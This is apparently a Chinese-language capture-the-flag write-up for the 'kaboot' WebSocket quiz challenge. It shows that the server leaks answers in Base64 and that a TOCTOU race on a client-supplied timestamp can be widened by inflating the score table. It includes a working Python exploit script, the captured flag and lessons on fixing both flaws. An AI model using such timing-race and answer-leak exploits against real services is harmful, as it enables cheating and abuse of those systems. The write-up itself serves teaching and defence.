# kaboot

## 题目简述

题目模拟实时答题。WebSocket 消息只是 Base64 包装的 JSON，服务端把每题的正确 `answer` 也一并发给客户端。答对基础分为 1000，但最终要求总分至少等于 `1000 × 题数`；正常网络延迟会让公式中的时间奖励为负。客户端可自行提交 `send_time`，而服务端对未来时间的检查与计分分别调用两次 `time()`，中间还会线性扫描全局成绩表，形成可放大的 TOCTOU 时间窗口。

## 解题过程

计分核心是：

```python
recv_time = time()
if get_room_scores(room_id) is not None and send_time >= time():
    return "???"

score += 1000 + max((send_time - recv_time) * 50, -500)
```

如果 `send_time` 略大于 `recv_time`，分数会超过 1000；只要它在后一次 `time()` 之前已经成为过去，就不会被拒绝。`get_room_scores` 每次遍历全局 `all_scores`，所以先创建大量连接和不同 UID，使成绩表膨胀，可以扩大两次取时之间的执行间隔。

每题 JSON 已直接给出 `answer`，攻击脚本只需回传它，并扫描合适的未来偏移。官方环境使用约 5.8 ms 起步、每轮增加 0.1 ms：

```python
from base64 import b64decode, b64encode
from json import loads, dumps
from time import time
from websocket import create_connection

def recv_json(ws):
    return loads(b64decode(ws.recv()))

def send_json(ws, value):
    ws.send(b64encode(dumps(value).encode()))

# 先在同一房间用大量不同 id 完成问答，扩大 all_scores。
inflate_score_table()

for attempt in range(100):
    ws = create_connection(ROOM_WEBSOCKET_URL)
    b64decode(ws.recv())  # quiz name
    uid = f"trial-{attempt}"
    while True:
        data = recv_json(ws)
        if "end" in data:
            print(data["message"])
            break
        send_json(ws, {
            "id": uid,
            "answer": data["answer"],
            "send_time": time() + 0.0058 + attempt / 10000,
        })
```

偏移命中窗口且十题都答对后，总分越过阈值，结束消息包含：

```text
tjctf{t00_sw1ft_f0r_y0u_b0iiiiii_2cfdfa7a}
```

## 方法总结

- 服务端绝不能把正确答案发给不可信客户端；Base64 只编码，不提供保密性。
- 计分时间应完全由服务端记录，并基于单调时钟计算。让客户端提交时间戳会引入时钟偏差与伪造空间。
- 两次读取当前时间之间夹着数据规模相关工作会形成竞态窗口；全局无界成绩表又使攻击者能主动放大该窗口。
